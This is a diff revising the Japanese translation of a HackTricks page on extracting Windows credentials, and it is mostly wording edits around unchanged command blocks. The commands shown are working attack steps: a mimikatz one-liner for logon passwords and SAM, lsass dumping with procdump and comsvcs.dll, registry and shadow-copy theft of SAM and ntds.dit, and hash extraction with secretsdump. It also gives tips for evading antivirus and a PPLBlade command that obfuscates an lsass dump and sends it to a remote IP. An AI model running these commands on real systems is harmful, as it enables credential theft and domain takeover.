@@ -9,8 +9,8 @@ HackTricksをサポートする他の方法：
 - **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 - [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する
-- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する
+- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
+- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
 
@@ -28,7 +28,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**[このページ](credentials-mimikatz.md)**でMimikatzができる他のことを見つける。 
+**[このページ](credentials-mimikatz.md)** **でMimikatzができる他のことを見つける。**
 
 ### Invoke-Mimikatz
 ```bash
@@ -40,7 +40,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Meterpreterを使用した資格情報
 
-被害者の中で**パスワードとハッシュを検索**するために、私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用します。**
+被害者の中で**パスワードとハッシュを検索**するために、私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用してください。**
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -64,7 +64,7 @@ mimikatz_command -f "lsadump::sam"
 **SysInternals**の**Procdump**は[**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)からの合法的なMicrosoftツールなので、Defenderに検出されません。\
 このツールを使用して**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、**ダンプからローカルで資格情報を抽出**することができます。
 
-{% code title="lsassをダンプ" %}
+{% code title="lsassをダンプする" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -85,11 +85,11 @@ mimikatz # sekurlsa::logonPasswords
 
 このプロセスは、[SprayKatz](https://github.com/aas-n/spraykatz)を使用して自動的に実行されます： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注意**: 一部の **AV** は **procdump.exe で lsass.exe をダンプする**ことを **悪意のあるもの**として **検出**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **検出**しているためです。そのため、lsass.exe の **PID** を procdump に **引数**として **渡す**ことが **よりステルス**です。
+**注意**: 一部の **AV** は **procdump.exe で lsass.exe をダンプする**ことを **悪意のあるもの**として **検出**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **検出**しているためです。そのため、lsass.exe の **PID** を procdump に **引数**として **渡す**ことが **lsass.exe の名前よりもステルス**です。
 
 ### **comsvcs.dll** を使用して lsass をダンプする
 
-`C:\Windows\System32` にある **comsvcs.dll** という名前の DLL は、クラッシュが発生した場合にプロセスメモリを **ダンプ**する責務を持っています。この DLL には、`rundll32.exe` を使用して呼び出される **`MiniDumpW`** という名前の **関数** が含まれています。\
+`C:\Windows\System32` にある **comsvcs.dll** という名前の DLL は、クラッシュが発生した場合に **プロセスメモリをダンプ**する責務を持っています。この DLL には、`rundll32.exe` を使用して呼び出される **`MiniDumpW`** という名前の **関数** が含まれています。\
 最初の2つの引数を使用する必要はありませんが、3番目の引数は3つのコンポーネントに分割されます。ダンプするプロセスの **PID** が最初のコンポーネントを構成し、ダンプファイルの場所が2番目を表し、3番目のコンポーネントは厳密に **full** という単語です。代替オプションは存在しません。\
 これらの3つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
 **comsvcs.dll** の利用は、lsass プロセスをダンプするために procdump をアップロードして実行する必要がなくなります。この方法について詳しくは、[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) で説明されています。
@@ -98,7 +98,7 @@ mimikatz # sekurlsa::logonPasswords
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**
+**[lssasy](https://github.com/Hackndo/lsassy)**を使用して、このプロセスを自動化できます。
 
 ### **タスクマネージャーを使用してlsassをダンプする**
 
@@ -116,18 +116,20 @@ Get-Process -Name LSASS
 ```
 ## PPLBladeを使用してlsassをダンプする
 
-[PPLBlade](https://github.com/tastypepperoni/PPLBlade)は、保護されたプロセスダンパーツールであり、メモリダンプを難読化し、それをディスクにドロップせずにリモートワークステーションに転送することをサポートしています。
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、保護されたプロセスダンパーツールであり、メモリダンプを難読化し、それをディスクにドロップせずにリモートワークステーションに転送する機能をサポートしています。
 
 **主な機能**:
 
 1. PPL保護のバイパス
-2. Defenderのシグネチャベースの検出メカニズムを回避するためにメモリダンプファイルを難読化する
+2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
 3. ディスクにドロップせずにRAWおよびSMBアップロード方法でメモリダンプをアップロードする（ファイルレスダンプ）
 
 {% code overflow="wrap" %}
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
+{% endcode %}
+
 ## CrackMapExec
 
 ### SAMハッシュのダンプ
@@ -163,18 +165,18 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Kaliマシン**にそれらのファイルを**ダウンロード**し、次のコマンドを使用して**ハッシュを抽出**します：
+**Kaliマシン**にそれらのファイルを**ダウンロード**し、次のコマンドを使用してハッシュを**抽出**します：
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### ボリュームシャドウコピー
+### ボリューム シャドウ コピー
 
 このサービスを使用して、保護されたファイルのコピーを作成できます。管理者である必要があります。
 
-#### vssadminを使用する
+#### vssadmin を使用する
 
-vssadminバイナリはWindows Serverバージョンのみで利用可能です。
+vssadmin バイナリは Windows Server バージョンのみで利用可能です。
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -187,7 +189,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-しかし、同じことを**Powershell**からも行うことができます。これは**SAMファイルをコピーする方法の例**です（使用されるハードドライブは"C:"で、C:\users\Publicに保存されます）。ただし、これは保護された任意のファイルをコピーするために使用できます。
+しかし、同じことを**Powershell**からも行うことができます。これは**SAMファイルをコピーする方法の例**です（使用されるハードドライブは"C:"で、C:\users\Publicに保存されます）。保護されたファイルをコピーするためにこれを使用できます。
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -196,7 +198,7 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-コードは次の本から取得：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+コードはこちらから: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
@@ -206,9 +208,9 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory Credentials - NTDS.dit**
 
-**NTDS.dit**ファイルは、**Active Directory**の中心部であり、ユーザーオブジェクト、グループ、およびそれらのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの**パスワードハッシュ**が格納されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_に存在します。
+**NTDS.dit**ファイルは**Active Directory**の中心部として知られており、ユーザーオブジェクト、グループ、およびそれらのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの**パスワードハッシュ**が格納されている場所です。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_に存在します。
 
-このデータベース内には、3つの主要なテーブルが保持されています:
+このデータベース内では、3つの主要なテーブルが管理されています:
 
 - **Data Table**: このテーブルは、ユーザーやグループなどのオブジェクトの詳細を格納する役割を担っています。
 - **Link Table**: グループメンバーシップなどの関係を追跡します。
@@ -216,25 +218,25 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 これに関する詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windowsは_Ntdsa.dll_を使用してそのファイルとやり取りし、_lsass.exe_によって使用されます。その後、**NTDS.dit**ファイルの**一部**が**`lsass`**メモリ内に存在する可能性があります（おそらく**キャッシュ**を使用してパフォーマンスが向上しているため、最新にアクセスされたデータを見つけることができます）。
+Windowsは_Ntdsa.dll_を使用してそのファイルとやり取りし、_lsass.exe_によって使用されます。その後、**NTDS.dit**ファイルの**一部**は**`lsass`**メモリ内に位置している可能性があります（おそらく**キャッシュ**を使用してパフォーマンスが向上しているため、最新にアクセスされたデータを見つけることができます）。
 
 #### NTDS.dit内のハッシュの復号化
 
 ハッシュは3回暗号化されます:
 
-1. **BOOTKEY**および**RC4**を使用して**パスワード暗号化キー（PEK）**を復号化します。
-2. **PEK**および**RC4**を使用して**ハッシュ**を復号化します。
+1. **BOOTKEY**と**RC4**を使用して**パスワード暗号化キー（PEK）**を復号化します。
+2. **PEK**と**RC4**を使用して**ハッシュ**を復号化します。
 3. **DES**を使用して**ハッシュ**を復号化します。
 
-**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内で**ドメインコントローラーのSYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これは、NTDS.ditファイルから資格情報を取得するためには、NTDS.ditファイルとSYSTEMファイル（_C:\Windows\System32\config\SYSTEM_）が必要である理由です。
+**PEK**は**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内で**ドメインコントローラーの**SYSTEMファイルの**BOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これは、NTDS.ditファイルから資格情報を取得するためには、NTDS.ditファイルとSYSTEMファイル（_C:\Windows\System32\config\SYSTEM_）が必要な理由です。
 
-### Ntdsutilを使用してNTDS.ditをコピーする
+### Ntdsutilを使用してNTDS.ditをコピー
 
 Windows Server 2008以降で利用可能です。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-また、**ntds.dit**ファイルをコピーするために[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用することもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用してください）。
+また、**ボリュームシャドウコピー**トリックを使用して**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、**ボリュームシャドウコピー**トリックを使用してください）。
 
 ### **NTDS.ditからハッシュを抽出する**
 
@@ -264,9 +266,9 @@ ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
 lazagne.exe all
 ```
-## SAM および LSASS から資格情報を抽出するためのその他のツール
+## SAM と LSASS から資格情報を抽出するためのその他のツール
 
-### Windows credentials Editor (WCE)
+### Windows Credentials Editor (WCE)
 
 このツールはメモリから資格情報を抽出するために使用できます。[こちら](https://www.ampliasecurity.com/research/windows-credentials-editor/)からダウンロードしてください。
 
@@ -287,22 +289,22 @@ type outpwdump
 ```
 ### PwDump7
 
-[ここ](http://www.tarasco.org/security/pwdump\_7) からダウンロードし、単に**実行**するだけでパスワードが抽出されます。
+[ここからダウンロード](http://www.tarasco.org/security/pwdump\_7)して、単に**実行**するだけでパスワードが抽出されます。
 
-## Defenses
+## 防御策
 
 [**こちらでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>
+<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**でAWSハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>!</strong></summary>
 
 HackTricksをサポートする他の方法:
 
-* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
+* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローしてください。
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
